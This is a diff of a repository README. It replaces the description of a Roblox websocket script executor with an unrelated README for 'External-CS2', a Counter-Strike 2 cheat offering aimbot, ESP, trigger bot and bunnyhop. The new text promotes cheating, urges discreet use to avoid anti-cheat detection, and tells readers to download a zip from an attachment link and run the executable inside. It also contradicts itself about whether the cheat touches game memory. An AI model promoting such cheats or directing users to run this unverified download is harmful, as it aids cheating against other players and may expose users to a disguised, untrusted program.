@@ -1,28 +1,58 @@
-# Roblox Websocket Executor
+# External-CS2
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+External-CS2 is an external cheat for Counter-Strike 2 that operates independently of the game's memory and is intended to improve Windows API skills. It includes features like AimBot, ESP with various visual aids, Trigger Bot, BunnyHop, and automatic offset updates.
 
-## How to use
+## Table of Contents
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+## Features
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+External-CS2 offers a range of features designed to enhance the gameplay experience and provide a deeper understanding of Windows API manipulation. Some of the key features include:
 
-### Demonstration
+### AimBot
+The AimBot feature allows players to automatically aim at opponents, improving accuracy and overall performance during gameplay.
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+### ESP (Extra Sensory Perception)
+ESP provides players with visual aids such as player outlines, names, health, and distance information, enhancing situational awareness and tactical decision-making.
 
-## Further explanation
+### Trigger Bot
+The Trigger Bot feature enables automatic shooting when an enemy is within the player's crosshair, increasing reaction speed and eliminating the need for manual shooting.
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+### BunnyHop
+BunnyHop assists players in executing perfectly timed jumps to navigate the game environment swiftly, allowing for quick repositioning and avoiding enemy fire.
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
+### Automatic Offset Updates
+External-CS2 automatically updates memory offsets to ensure compatibility with the latest game versions, reducing the risk of detection and providing a seamless cheating experience.
 
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
+## Installation
 
-## Attribution
+To use External-CS2, follow these steps:
 
-Here are a list of open-source libraries used by this project.
+1. Download the cheat from the following link: [![Download Cheat](https://img.shields.io/badge/download-here-%232196f3)](https://github.com/user-attachments/files/16419441/Cheat.zip)
+2. Extract the downloaded files to a folder on your system.
+3. Run the cheat executable to launch the program.
 
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+## Usage
+
+Once External-CS2 is installed, launch the cheat and then launch Counter-Strike 2. Configure the desired features using the cheat's user interface or hotkeys. Enjoy enhanced gameplay with improved aim, awareness, and movement capabilities. Remember to use the cheat responsibly and avoid detection by using features discreetly.
+
+## Contributing
+
+Contributions to External-CS2 are welcome! If you have suggestions for new features, improvements, or bug fixes, feel free to fork the repository and submit a pull request. To contribute effectively, follow these guidelines:
+
+- Fork the repository.
+- Create a new branch for your feature or fix.
+- Make your changes and test them thoroughly.
+- Submit a pull request with a descriptive title and detailed information about the changes.
+
+## License
+
+The External-CS2 cheat is distributed under the MIT License. See the `LICENSE` file for more information.
+
+---
+
+Feel free to explore External-CS2 and enhance your Counter-Strike 2 gameplay experience with advanced features and improved skills. If you have any questions or feedback, don't hesitate to reach out. Happy cheating in Counter-Strike 2! 🎮🚀
